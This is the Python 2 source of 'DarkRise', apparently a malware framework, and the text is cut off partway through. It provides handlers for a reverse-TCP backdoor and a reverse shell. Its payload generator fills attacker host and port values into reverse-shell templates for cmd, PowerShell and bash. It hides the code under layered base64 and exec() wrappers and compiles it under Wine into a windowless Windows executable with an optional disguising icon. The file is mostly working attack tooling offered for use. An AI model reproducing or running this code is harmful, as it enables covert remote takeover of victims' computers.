#!/usr/bin/python2
#-*- coding:utf-8 -*-

import os
import subprocess
import logging
import readline
import platform
import requests
import json
import sys
import random
import shlex
import requests
import json



class SimpleCompleter(object):

    def __init__(self, options):
        self.options = sorted(options)
        return

    def complete(self, text, state):
        response = None
        if state == 0:
            # This is the first time for this text, so build a match list.
            if text:
                self.matches = [s
                                for s in self.options
                                if s and s.startswith(text)]
                logging.debug('%s matches: %s', repr(text), self.matches)
            else:
                self.matches = self.options[:]
                logging.debug('(empty input) matches: %s', self.matches)

        # Return the state'th item from the match list,
        # if we have that many.
        try:
            response = self.matches[state]
        except IndexError:
            response = None
        logging.debug('complete(%s, %s) => %s',
                      repr(text), state, repr(response))
        return response

banner1 = '''
▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀    ██▀███   ██▓  ██████ ▓█████
▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒    ▓██ ▒ ██▒▓██▒▒██    ▒ ▓█   ▀
░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░    ▓██ ░▄█ ▒▒██▒░ ▓██▄   ▒███
░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄    ▒██▀▀█▄  ░██░  ▒   ██▒▒▓█  ▄
░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄   ░██▓ ▒██▒░██░▒██████▒▒░▒████▒
 ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒   ░ ▒▓ ░▒▓░░▓  ▒ ▒▓▒ ▒ ░░░ ▒░ ░
 ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░     ░▒ ░ ▒░ ▒ ░░ ░▒  ░ ░ ░ ░  ░
 ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░      ░░   ░  ▒ ░░  ░  ░     ░
   ░          ░  ░   ░     ░  ░         ░      ░        ░     ░  ░
 ░

'''

banner2 = '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :
                              .
'''

banner3 = '''
 ▄▀▀█▄▄   ▄▀▀█▄   ▄▀▀▄▀▀▀▄  ▄▀▀▄ █      ▄▀▀▄▀▀▀▄  ▄▀▀█▀▄   ▄▀▀▀▀▄  ▄▀▀█▄▄▄▄
█ ▄▀   █ ▐ ▄▀ ▀▄ █   █   █ █  █ ▄▀     █   █   █ █   █  █ █ █   ▐ ▐  ▄▀   ▐
▐ █    █   █▄▄▄█ ▐  █▀▀█▀  ▐  █▀▄      ▐  █▀▀█▀  ▐   █  ▐    ▀▄     █▄▄▄▄▄
  █    █  ▄▀   █  ▄▀    █    █   █      ▄▀    █      █    ▀▄   █    █    ▌
 ▄▀▄▄▄▄▀ █   ▄▀  █     █   ▄▀   █      █     █    ▄▀▀▀▀▀▄  █▀▀▀    ▄▀▄▄▄▄
█     ▐  ▐   ▐   ▐     ▐   █    ▐      ▐     ▐   █       █ ▐       █    ▐
▐                          ▐                     ▐       ▐         ▐
'''

banner4 = '''
 ______                  __        _______      _
|_   _ `.               [  |  _   |_   __ \    (_)
  | | `. \ ,--.   _ .--. | | / ]    | |__) |   __   .--.  .---.
  | |  | |`'_\ : [ `/'`\]| '' <     |  __ /   [  | ( (`\]/ /__\\
 _| |_.' /// | |, | |    | |`\ \   _| |  \ \_  | |  `'.'.| \__.,
|______.' \'-;__/[___]  [__|  \_] |____| |___|[___][\__) )'.__.'

'''

banner5 = '''
>====>                         >=>            >======>
>=>   >=>                      >=>            >=>    >=>    >>
>=>    >=>    >=> >=>  >> >==> >=>  >=>       >=>    >=>        >===>    >==>
>=>    >=>  >=>   >=>   >=>    >=> >=>        >> >==>      >=> >=>     >>   >=>
>=>    >=> >=>    >=>   >=>    >=>=>          >=>  >=>     >=>   >==>  >>===>>=>
>=>   >=>   >=>   >=>   >=>    >=> >=>        >=>    >=>   >=>     >=> >>
>====>       >==>>>==> >==>    >=>  >=>       >=>      >=> >=> >=> >=>  >====>


'''

banner6 = '''
██▄   ██   █▄▄▄▄ █  █▀     █▄▄▄▄ ▄█    ▄▄▄▄▄   ▄███▄
█  █  █ █  █  ▄▀ █▄█       █  ▄▀ ██   █     ▀▄ █▀   ▀
█   █ █▄▄█ █▀▀▌  █▀▄       █▀▀▌  ██ ▄  ▀▀▀▀▄   ██▄▄
█  █  █  █ █  █  █  █      █  █  ▐█  ▀▄▄▄▄▀    █▄   ▄▀
███▀     █   █     █         █    ▐            ▀███▀
        █   ▀     ▀         ▀
       ▀
'''

banner7 = '''
 .S_sSSs     .S_SSSs     .S_sSSs     .S    S.          .S_sSSs     .S    sSSs    sSSs
.SS~YS%%b   .SS~SSSSS   .SS~YS%%b   .SS    SS.        .SS~YS%%b   .SS   d%%SP   d%%SP
S%S   `S%b  S%S   SSSS  S%S   `S%b  S%S    S&S        S%S   `S%b  S%S  d%S'    d%S'
S%S    S%S  S%S    S%S  S%S    S%S  S%S    d*S        S%S    S%S  S%S  S%|     S%S
S%S    S&S  S%S SSSS%S  S%S    d*S  S&S   .S*S        S%S    d*S  S&S  S&S     S&S
S&S    S&S  S&S  SSS%S  S&S   .S*S  S&S_sdSSS         S&S   .S*S  S&S  Y&Ss    S&S_Ss
S&S    S&S  S&S    S&S  S&S_sdSSS   S&S~YSSY%b        S&S_sdSSS   S&S  `S&&S   S&S~SP
S&S    S&S  S&S    S&S  S&S~YSY%b   S&S    `S%        S&S~YSY%b   S&S    `S*S  S&S
S*S    d*S  S*S    S&S  S*S   `S%b  S*S     S%        S*S   `S%b  S*S     l*S  S*b
S*S   .S*S  S*S    S*S  S*S    S%S  S*S     S&        S*S    S%S  S*S    .S*P  S*S.
S*S_sdSSS   S*S    S*S  S*S    S&S  S*S     S&        S*S    S&S  S*S  sSS*S    SSSbs
SSS~YSSY    SSS    S*S  S*S    SSS  S*S     SS        S*S    SSS  S*S  YSS'      YSSP
                   SP   SP          SP                SP          SP
                   Y    Y           Y                 Y           Y

'''

descrip = '''
                [DarkRise - By 0x4eff (Unamed, Dxvistxr) - 2019]


            \033[1;91m[ \033[00mAuthor : \033[1;91m0x4eff     \033[1;91m]\033[00m
            \033[1;91m[ \033[00mGithub : \033[1;91mDxvistxr   \033[1;91m]\033[00m
            \033[1;91m[ \033[00mYoutube : \033[1;91mDavistar  \033[1;91m]\033[00m
            \033[1;91m[ \033[00mInstagram : \033[1;91m0x4eff  \033[1;91m]\033[00m
            \033[1;91m[ \033[00mVersion : \033[1;91m2.0       \033[1;91m]\033[00m
                        Malware Tools

'''

def clear_os():
    if 'Linux' not in platform.platform():
        sys.exit('[*] Linux Required !')

    elif 'Windows' not in platform.platform():
        os.system('clear')

def main():
    if sys.version[0] =='3':
            sys.exit('[*] Please Run Backdoor With Python2')

    choice_banner = [banner1,banner2,banner3,banner4,banner5,banner6,banner7]
    choice_banner_print = random.choice(choice_banner)
    clear_os()
    clear_os()
    print(choice_banner_print)
    print(descrip)
    try:
        readline.set_completer(SimpleCompleter(['help', 'use','show','modules','exit','quit','handler/','python/','backdoor/reverse_tcp','payload/','reverse_shell_tcp']).complete)
        readline.parse_and_bind('tab: complete')
        while True:
            try:
                command_main = raw_input('\033[00mDark\033[1;91mRise\033[00m@\033[1;91mMain\033[00m$ ')

                if command_main.startswith('help')==True:
                    print('[****************Help Main***********************]')
                    print('[ command                 descriptions           ]')
                    print('[ -------                 ------------           ]')
                    print('[  use <module>            Use Module            ]')
                    print('[  set <options>           Set Options           ]')
                    print('[  show modules            show modules          ]')
                    print('[  show infos              show options          ]')
                    print('[  exit or quit             Exiting Framework    ]')
                    print('[  payload <payload>        Generate Payload     ]')
                    print('[  handler <payload>        Run Handler          ]')
                    print('[************************************************]')

                elif command_main.startswith('quit') or command_main.startswith('exit')==True:
                    sys.exit()

                elif command_main.startswith('show modules')==True:
                    print('[****************Modules********************]')
                    print('               handler                     ')
                    print('handler/python/backdoor/reverse_tcp         ')
                    print('handler/reverse_shell_tcp            ')
                    print('\n')
                    print('               Payloads                    ')
                    print('payload/python/backdoor/reverse_tcp        ')
                    print('payload/python/reverse_shell_tcp           ')

                elif command_main.startswith('banner')==True:
                    choice_banner = [banner1,banner2,banner3,banner4,banner5,banner6,banner7]
                    choice_banner_print = random.choice(choice_banner)
                    #clear_os()
                    #clear_os()
                    print(choice_banner_print)
                    print(descrip)

                elif command_main.startswith('clear')==True:
                    clear_os()

                elif command_main.startswith('use handler/python/backdoor/reverse_tcp')==True:
                    try:
                        readline.set_completer(SimpleCompleter(['show infos','set','lhost','lport','ftpuser','ftppass','ftppath','run','exploit']).complete)
                        readline.parse_and_bind('tab: complete')
                        LHOST = None
                        LPORT = None
                        FTPUSER = None
                        FTPPASS = None
                        FTPPATH = None
                        while True:
                            try:
                                exploit_backdoor_rtcp = raw_input('\033[00mDark\033[1;91mRise(\033[00mexploit/backdoor/reverse_tcp\033[1;91m)\033[00m$ ')

                                if exploit_backdoor_rtcp.startswith('show infos')==True:
                                    print(' setting                                required ')
                                    print(' -------                                ---------')
                                    print(' lhost => %s                              yes    ' % (LHOST))
                                    print(' lport => %s                              yes    ' % (LPORT))
                                    print(' ftpuser => %s                            yes    ' % (FTPUSER))
                                    print(' ftppass => %s                            yes    ' % (FTPPASS))
                                    print(' ftppath => %s                            yes    ' % (FTPPATH))
                                    print('\n')
                                    print('\n')

                                elif exploit_backdoor_rtcp.startswith('banner')==True:
                                    choice_banner = [banner1,banner2,banner3,banner4,banner5,banner6,banner7]
                                    choice_banner_print = random.choice(choice_banner)
                                    #clear_os()
                                    #clear_os()
                                    print(choice_banner_print)
                                    print(descrip)

                                elif exploit_backdoor_rtcp.startswith('clear')==True:
                                    clear_os()

                                elif exploit_backdoor_rtcp.startswith('help')==True:
                                    print('set <options> <value>')
                                    print('show infos')
                                    print('exploit')

                                elif exploit_backdoor_rtcp.startswith('set lhost')==True:
                                    split = shlex.split(exploit_backdoor_rtcp)
                                    ip = split[2]
                                    LHOST = ip
                                    print('lhost => %s' % (LHOST))

                                elif exploit_backdoor_rtcp.startswith('set ftppath')==True:
                                    split = shlex.split(exploit_backdoor_rtcp)
                                    path = split[2]
                                    FTPPATH = path
                                    print('ftppath => %s' % (FTPPATH))

                                elif exploit_backdoor_rtcp.startswith('set lport')==True:
                                    split = shlex.split(exploit_backdoor_rtcp)
                                    port = split[2]
                                    LPORT = port
                                    print('lport => %s' % (LPORT))

                                elif exploit_backdoor_rtcp.startswith('set ftpuser')==True:
                                    split = shlex.split(exploit_backdoor_rtcp)
                                    username = split[2]
                                    FTPUSER = username
                                    print('ftpuser => %s' % (FTPUSER))

                                elif exploit_backdoor_rtcp.startswith('set ftppass')==True:
                                    split = shlex.split(exploit_backdoor_rtcp)
                                    password = split[2]
                                    FTPPASS = password
                                    print('ftppass => %s' % (FTPPASS))

                                elif exploit_backdoor_rtcp.startswith('quit')==True:
                                    sys.exit()

                                elif exploit_backdoor_rtcp.startswith('exploit') or exploit_backdoor_rtcp.startswith('run')==True:
                                    check_handler = os.path.exists('darkrise_listener.py')

                                    if check_handler ==True:
                                        if LHOST and LPORT and FTPUSER and FTPPASS and FTPPATH !=None:
                                            os.system('python2 darkrise_listener.py %s %s %s %s %s' % (LHOST,LPORT,FTPUSER,FTPPASS,FTPPATH))
                                        else:
                                            print('[*] Please Set Requirement Configuration !')
                                    else:
                                        print('[*] Handler Not Found !')

                            except KeyboardInterrupt:
                                print('[*] CTRL + C press quit for exit !')

                    except Exception as error_backdoor_reverse_tcp:
                        print(error_backdoor_reverse_tcp)

                elif command_main.startswith('use handler/reverse_shell_tcp')==True:
                    try:
                        readline.set_completer(SimpleCompleter(['show infos','set','lhost','lport','run','exploit']).complete)
                        readline.parse_and_bind('tab: complete')
                        LHOST = None
                        LPORT = None
                        while True:
                            try:
                                exploit_rtcp = raw_input('\033[00mDark\033[1;91mRise(\033[00mexploit/reverse_shell_tcp\033[1;91m)\033[00m$ ')

                                if exploit_rtcp.startswith('show infos')==True:
                                    print(' setting                                required ')
                                    print(' -------                                ---------')
                                    print(' lhost => %s                              yes    ' % (LHOST))
                                    print(' lport => %s                              yes    ' % (LPORT))
                                    print('\n')
                                    print('\n')

                                elif exploit_rtcp.startswith('help')==True:
                                    print('set <options> <value>')
                                    print('show infos')
                                    print('exploit')

                                elif exploit_rtcp.startswith('banner')==True:
                                    choice_banner = [banner1,banner2,banner3,banner4,banner5,banner6,banner7]
                                    choice_banner_print = random.choice(choice_banner)
                                    #clear_os()
                                    #clear_os()
                                    print(choice_banner_print)
                                    print(descrip)

                                elif exploit_rtcp.startswith('clear')==True:
                                    clear_os()

                                elif exploit_rtcp.startswith('set lhost')==True:
                                    split = shlex.split(exploit_rtcp)
                                    ip = split[2]
                                    LHOST = ip
                                    print('lhost => %s' % (LHOST))

                                elif exploit_rtcp.startswith('set lport')==True:
                                    split = shlex.split(exploit_rtcp)
                                    port = split[2]
                                    LPORT = port
                                    print('lport => %s' % (LPORT))

                                elif exploit_rtcp.startswith('quit')==True:
                                    sys.exit()

                                elif exploit_rtcp.startswith('exploit') or exploit_rtcp.startswith('run')==True:
                                    check_handler = os.path.exists('darkrise_reverse.py')

                                    if check_handler ==True:
                                        if LHOST and LPORT !=None:
                                            os.system('python2 darkrise_reverse.py %s %s' % (LHOST,LPORT))
                                        else:
                                            print('[*] Please Set Requirement Configuration !')
                                    else:
                                        print('[*] Handler Not Found !')

                            except KeyboardInterrupt:
                                print('[*] CTRL+C')


                    except Exception as error_reverse_shell_tcp:
                        print(error_reverse_shell_tcp)

                elif command_main.startswith('use payload/python/reverse_shell_tcp')==True:
                    try:
                        readline.set_completer(SimpleCompleter(['show infos','shell_env','quit','show shell','set','lhost','name','lport','generate']).complete)
                        readline.parse_and_bind('tab: complete')
                        LHOST = None
                        LPORT = None
                        SHELL_ENV = None
                        NAME = None

                        while True:
                            rtcp = raw_input('\033[00mDark\033[1;91mRise(\033[00mpayload/reverse_shell_tcp\033[1;91m)\033[00m$ ')

                            if rtcp.startswith('show infos')==True:
                                print(' setting                                required ')
                                print(' -------                                ---------')
                                print(' lhost => %s                              yes    ' % (LHOST))
                                print(' lport => %s                              yes    ' % (LPORT))
                                print(' shell => %s                              yes    ' % (SHELL_ENV))
                                print(' name => %s                               yes    ' % (NAME))
                                print('\n')
                                print('\n')

                            elif rtcp.startswith('banner')==True:
                                choice_banner = [banner1,banner2,banner3,banner4,banner5,banner6,banner7]
                                choice_banner_print = random.choice(choice_banner)
                                #clear_os()
                                #clear_os()
                                print(choice_banner_print)
                                print(descrip)

                            elif rtcp.startswith('clear')==True:
                                clear_os()

                            elif rtcp.startswith('help')==True:
                                print('set <options> <value>')
                                print('show infos')
                                print('show shell')
                                print('generate')

                            elif rtcp.startswith('show shell')==True:
                                print('shell :')
                                print('      cmd')
                                print('      powershell')
                                print('      bash')

                            elif rtcp.startswith('set lhost')==True:
                                split = shlex.split(rtcp)
                                ip = split[2]
                                LHOST = ip
                                print('lhost => %s' % (LHOST))

                            elif rtcp.startswith('set shell')==True:
                                split = shlex.split(rtcp)
                                shell = split[2]
                                SHELL_ENV = shell
                                print('shell => %s' % (SHELL_ENV))

                            elif rtcp.startswith('set lport')==True:
                                split = shlex.split(rtcp)
                                port = split[2]
                                LPORT = port
                                print('lport => %s' % (LPORT))

                            elif rtcp.startswith('quit')==True:
                                sys.exit()

                            elif rtcp.startswith('set name')==True:
                                split = shlex.split(rtcp)
                                name = split[2]
                                NAME = name
                                print('name => %s' % (NAME))

                            elif rtcp.startswith('generate')==True:
                                if LHOST and LPORT and SHELL_ENV and NAME !=None:

                                    if SHELL_ENV =='cmd':
                                        check_cmd_payload = os.path.exists('darkrise_rcmd.py')
                                        if check_cmd_payload ==True:
                                            var_inst_payload = 'exd.py'
                                            os.system('cp darkrise_rcmd.py %s' % (var_inst_payload))
                                            f=open(var_inst_payload,'r')
                                            content = f.read()
                                            f.close()
                                            replace_lhost = content.replace('192.168.1.71',LHOST)
                                            f=open(var_inst_payload,'w')
                                            f.write(replace_lhost)
                                            f.close()
                                            f=open(var_inst_payload,'r')
                                            content = f.read()
                                            f.close()
                                            replace_lport = content.replace('1334',LPORT)
                                            f=open(var_inst_payload,'w')
                                            f.write(replace_lport)
                                            f.close()
                                            check_wine = os.path.exists('/usr/bin/wine')
                                            if check_wine ==True:
                                                print('[*] Wine Found !')
                                                check_python_path = os.path.exists('/root/.wine/drive_c/Python27')
                                                if check_python_path ==True:
                                                    print('[*] Wine Python Path Found !')
                                                    var_inst_payload_2 = 'exd2.py'
                                                    f=open(var_inst_payload,'r')
                                                    content = f.read()
                                                    f.close()
                                                    encode_content = content.encode('base64')
                                                    f=open(var_inst_payload_2,'w')
                                                    f.write('#!/usr/bin/python2\n')
                                                    f.write('#-*- coding:utf-8 -*-\n')
                                                    f.write('import os\n')
                                                    f.write('import subprocess\n')
                                                    f.write('import threading\n')
                                                    f.write('import sys\n')
                                                    f.write('import socket\n')
                                                    f.write('import platform\n')
                                                    f.write('\n')
                                                    f.write('payload = """%s"""\n' % (encode_content))
                                                    f.write('exec(payload.decode("base64"))\n')
                                                    f.close()
                                                    cmd_shcode = subprocess.Popen('python2 sh_code.py %s' % (var_inst_payload_2), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                                    shellcode_output = cmd_shcode.stdout.read() + cmd_shcode.stderr.read()
                                                    f=open('shcode.txt','w')
                                                    f.write(shellcode_output)
                                                    f.close()
                                                    os.system('rm %s ' % (var_inst_payload))
                                                    var_inst_payload_3 = 'exd3.py'
                                                    f=open(var_inst_payload_3,'w')
                                                    f.write('#!/usr/bin/python2\n')
                                                    f.write('#-*- coding:utf-8 -*-\n')
                                                    f.write('import os\n')
                                                    f.write('import subprocess\n')
                                                    f.write('import threading\n')
                                                    f.write('import sys\n')
                                                    f.write('import socket\n')
                                                    f.write('import platform\n')
                                                    f.write('\n')
                                                    f.write('payload = ""\n')
                                                    rf=open('shcode.txt','r')
                                                    content = rf.readlines()
                                                    for buffer_line in content:
                                                        buffer_line = buffer_line.rstrip()
                                                        f.write('payload += %s\n' % (buffer_line))

                                                    f.write('exec payload\n')
                                                    f.close()
                                                    print('[*] Shellcode Writed !')
                                                    f=open(var_inst_payload_3,'r')
                                                    content_shellcode = f.read()
                                                    f.close()
                                                    encode_b64 = content_shellcode.encode('base64')
                                                    var_inst_payload_4 = 'exd4.py'
                                                    f=open(var_inst_payload_4,'w')
                                                    f.write('#!/usr/bin/python2\n')
                                                    f.write('#-*- coding:utf-8 -*-\n')
                                                    f.write('\n')
                                                    f.write('import os\n')
                                                    f.write('import subprocess\n')
                                                    f.write('import threading\n')
                                                    f.write('import sys\n')
                                                    f.write('import socket\n')
                                                    f.write('import platform\n')
                                                    f.write('\n')
                                                    f.write('payload_b64 = """%s"""\n' % (encode_b64))
                                                    f.write('exec payload_b64.decode("base64")')
                                                    f.close()
                                                    print('[*] Payload Writed ! Generate')
                                                    os.system('mv %s %s.py' % (var_inst_payload_4,NAME))
                                                    os.system('rm exd2.py exd3.py shcode.txt')
                                                    choice_compile = raw_input('[*] Do You Want Compile Payload (yes/no) :> ')

                                                    if choice_compile =='yes':
                                                        icon = raw_input('[*] Do You Want Apply Icon (yes/no) :> ')

                                                        if icon =='yes':
                                                            icon_ico = raw_input('[*] Enter Icon Path :> ')
                                                            print('[*] Wait Moment Please Generating Payload !')
                                                            os.system('wine python pyinstaller/pyinstaller.py -F --noconsole -i %s -n %s.exe %s.py' % (icon_ico,NAME,NAME))
                                                            print('[*] Payload Compiled ! Save As Output %s.exe' % (NAME))

                                                        elif icon =='no':
                                                            print('[*] Wait Moment Please Generating Payload !')
                                                            os.system('wine python pyinstaller/pyinstaller.py -F --noconsole -n %s.exe %s.py' % (NAME,NAME))
                                                            print('[*] Payload Compiled ! Save As Output %s.exe' % (NAME))

                                                    elif choice_compile =='no':
                                                        print('[*] Payload Compiled ! Save As Output %s.py' % (NAME))
                                        else:
                                            print('[!] Payload Not Found ! Sorry =(')

                                    elif SHELL_ENV =='powershell':
                                        check_cmd_payload = os.path.exists('darkrise_rpwsh.py')
                                        if check_cmd_payload ==True:
                                            var_inst_payload = 'exd.py'
                                            os.system('cp darkrise_rpwsh.py %s' % (var_inst_payload))
                                            f=open(var_inst_payload,'r')
                                            content = f.read()
                                            f.close()
                                            replace_lhost = content.replace('192.168.1.71',LHOST)
                                            f=open(var_inst_payload,'w')
                                            f.write(replace_lhost)
                                            f.close()
                                            f=open(var_inst_payload,'r')
                                            content = f.read()
                                            f.close()
                                            replace_lport = content.replace('1334',LPORT)
                                            f=open(var_inst_payload,'w')
                                            f.write(replace_lport)
                                            f.close()
                                            check_wine = os.path.exists('/usr/bin/wine')
                                            if check_wine ==True:
                                                print('[*] Wine Found !')
                                                check_python_path = os.path.exists('/root/.wine/drive_c/Python27')
                                                if check_python_path ==True:
                                                    print('[*] Wine Python Path Found !')
                                                    var_inst_payload_2 = 'exd2.py'
                                                    f=open(var_inst_payload,'r')
                                                    content = f.read()
                                                    f.close()
                                                    encode_content = content.encode('base64')
                                                    f=open(var_inst_payload_2,'w')
                                                    f.write('#!/usr/bin/python2\n')
                                                    f.write('#-*- coding:utf-8 -*-\n')
                                                    f.write('import os\n')
                                                    f.write('import subprocess\n')
                                                    f.write('import threading\n')
                                                    f.write('import sys\n')
                                                    f.write('import socket\n')
                                                    f.write('import platform\n')
                                                    f.write('\n')
                                                    f.write('payload = """%s"""\n' % (encode_content))
                                                    f.write('exec(payload.decode("base64"))\n')
                                                    f.close()
                                                    cmd_shcode = subprocess.Popen('python2 sh_code.py %s' % (var_inst_payload_2), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                                    shellcode_output = cmd_shcode.stdout.read() + cmd_shcode.stderr.read()
                                                    f=open('shcode.txt','w')
                                                    f.write(shellcode_output)
                                                    f.close()
                                                    os.system('rm %s ' % (var_inst_payload))
                                                    var_inst_payload_3 = 'exd3.py'
                                                    f=open(var_inst_payload_3,'w')
                                                    f.write('#!/usr/bin/python2\n')
                                                    f.write('#-*- coding:utf-8 -*-\n')
                                                    f.write('import os\n')
                                                    f.write('import subprocess\n')
                                                    f.write('import threading\n')
                                                    f.write('import sys\n')
                                                    f.write('import socket\n')
                                                    f.write('import platform\n')
                                                    f.write('\n')
                                                    f.write('payload = ""\n')
                                                    rf=open('shcode.txt','r')
                                                    content = rf.readlines()
                                                    for buffer_line in content:
                                                        buffer_line = buffer_line.rstrip()
                                                        f.write('payload += %s\n' % (buffer_line))

                                                    f.write('exec payload\n')
                                                    f.close()
                                                    print('[*] Shellcode Writed !')
                                                    f=open(var_inst_payload_3,'r')
                                                    content_shellcode = f.read()
                                                    f.close()
                                                    encode_b64 = content_shellcode.encode('base64')
                                                    var_inst_payload_4 = 'exd4.py'
                                                    f=open(var_inst_payload_4,'w')
                                                    f.write('#!/usr/bin/python2\n')
                                                    f.write('#-*- coding:utf-8 -*-\n')
                                                    f.write('\n')
                                                    f.write('import os\n')
                                                    f.write('import subprocess\n')
                                                    f.write('import threading\n')
                                                    f.write('import sys\n')
                                                    f.write('import socket\n')
                                                    f.write('import platform\n')
                                                    f.write('\n')
                                                    f.write('payload_b64 = """%s"""\n' % (encode_b64))
                                                    f.write('exec payload_b64.decode("base64")')
                                                    f.close()
                                                    print('[*] Payload Writed ! Generate')
                                                    os.system('mv %s %s.py' % (var_inst_payload_4,NAME))
                                                    os.system('rm exd2.py exd3.py shcode.txt')
                                                    choice_compile = raw_input('[*] Do You Want Compile Payload (yes/no) :> ')

                                                    if choice_compile =='yes':
                                                        icon = raw_input('[*] Do You Want Apply Icon (yes/no) :> ')

                                                        if icon =='yes':
                                                            icon_ico = raw_input('[*] Enter Icon Path :> ')
                                                            print('[*] Wait Moment Please Generating Payload !')
                                                            os.system('wine python pyinstaller/pyinstaller.py -F --noconsole -i %s -n %s.exe %s.py' % (icon_ico,NAME,NAME))
                                                            print('[*] Payload Compiled ! Save As Output %s.exe' % (NAME))

                                                        elif icon =='no':
                                                            print('[*] Wait Moment Please Generating Payload !')
                                                            os.system('wine python pyinstaller/pyinstaller.py -F --noconsole -n %s.exe %s.py' % (NAME,NAME))
                                                            print('[*] Payload Compiled ! Save As Output %s.exe' % (NAME))

                                                elif choice_compile =='no':
                                                    print('[*] Payload Compiled ! Save As Output %s.py' % (NAME))

                                            else:
                                                print('[!] Payload Not Found ! Sorry =(')

                                    elif SHELL_ENV =='bash':
                                        check_cmd_payload = os.path.exists('darkrise_rbash.py')
                                        if check_cmd_payload ==True:
                                            var_inst_payload = 'exd.py'
                                            os.system('cp darkrise_rbash.py %s' % (var_inst_payload))
                                            f=open(var_inst_payload,'r')
                                            content = f.read()
                                            f.close()
                                            replace_lhost = content.replace('192.168.1.71',LHOST)
                                            f=open(var_inst_payload,'w')
                                            f.write(replace_lhost)
                                            f.close()
                                            f=open(var_inst_payload,'r')
                                            content = f.read()
                                            f.close()
                                            replace_lport = content.replace('1334',LPORT)
                                            f=open(var_inst_payload,'w')
                                            f.write(replace_lport)
                                            f.close()
                                            check_wine = os.path.exists('/usr/bin/wine')
                                            if check_wine ==True:
                                                print('[*] Wine Found !')
                                                check_python_path = os.path.exists('/root/.wine/drive_c/Python27')
                                                if check_python_path ==True:
                                                    print('[*] Wine Python Path Found !')
                                                    var_inst_payload_2 = 'exd2.py'
                                                    f=open(var_inst_payload,'r')
                                                    content = f.read()
                                                    f.close()
                                                    encode_content = content.encode('base64')
                                                    f=open(var_inst_payload_2,'w')
                                                    f.write('#!/usr/bin/python2\n')
                                                    f.write('#-*- coding:utf-8 -*-\n')
                                                    f.write('import os\n')
                                                    f.write('import subprocess\n')
                                                    f.write('import threading\n')
                                                    f.write('import sys\n')
                                                    f.write('import socket\n')
                                                    f.write('import platform\n')
                                                    f.write('\n')
                                                    f.write('payload = """%s"""\n' % (encode_content))
                                                    f.write('exec(payload.decode("base64"))\n')
                                                    f.close()
                                                    cmd_shcode = subprocess.Popen('python2 sh_code.py %s' % (var_inst_payload_2), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                                    shellcode_output = cmd_shcode.stdout.read() + cmd_shcode.stderr.read()
                                                    f=open('shcode.txt','w')
                                                    f.write(shellcode_output)
                                                    f.close()
                                                    os.system('rm %s ' % (var_inst_payload))
                                                    var_inst_payload_3 = 'exd3.py'
                                                    f=open(var_inst_payload_3,'w')
                                                    f.write('#!/usr/bin/python2\n')
                                                    f.write('#-*- coding:utf-8 -*-\n')
                                                    f.write('import os\n')
                                                    f.write('import subprocess\n')
                                                    f.write('import threading\n')
                                                    f.write('import sys\n')
                                                    f.write('import socket\n')
                                                    f.write('import platform\n')
                                                    f.write('\n')
                                                    f.write('payload = ""\n')
                                                    rf=open('shcode.txt','r')
                                                    content = rf.readlines()
                                                    for buffer_line in content:
                                                        buffer_line = buffer_line.rstrip()
                                                        f.write('payload += %s\n' % (buffer_line))

                                                    f.write('exec payload\n')
                                                    f.close()
                                                    print('[*] Shellcode Writed !')
                                                    f=open(var_inst_payload_3,'r')
                                                    content_shellcode = f.read()
                                                    f.close()
                                                    encode_b64 = content_shellcode.encode('base64')
                                                    var_inst_payload_4 = 'exd4.py'
                                                    f=open(var_inst_payload_4,'w')
                                                    f.write('#!/usr/bin/python2\n')
                                                    f.write('#-*- coding:utf-8 -*-\n')
                                                    f.write('\n')
                                                    f.write('import os\n')
                                                    f.write('import subprocess\n')
                                                    f.write('import threading\n')
                                                    f.write('import sys\n')
                                                    f.write('import socket\n')
                                                    f.write('import platform\n')
                                                    f.write('\n')
                                                    f.write('payload_b64 = """%s"""\n' % (encode_b64))
                                                    f.write('exec payload_b64.decode("base64")')
                                                    f.close()
                                                    print('[*] Payload Writed ! Generate')
                                                    os.system('mv %s %s.py' % (var_inst_payload_4,NAME))
                                                    os.system('rm exd2.py exd3.py shcode.txt')
                                                    choice_compile = raw_input('[*] Do You Want Compile Payload (yes/no) :> ')

                                                    if choice_compile =='yes':
                                                        icon = raw_input('[*] Do You Want Apply Icon (yes/no) :> ')

                                                        if icon =='yes':
                                                            icon_ico = raw_input('[*] Enter Icon Path :> ')
                                                            print('[*] Wait Moment Please Generating Payload !')
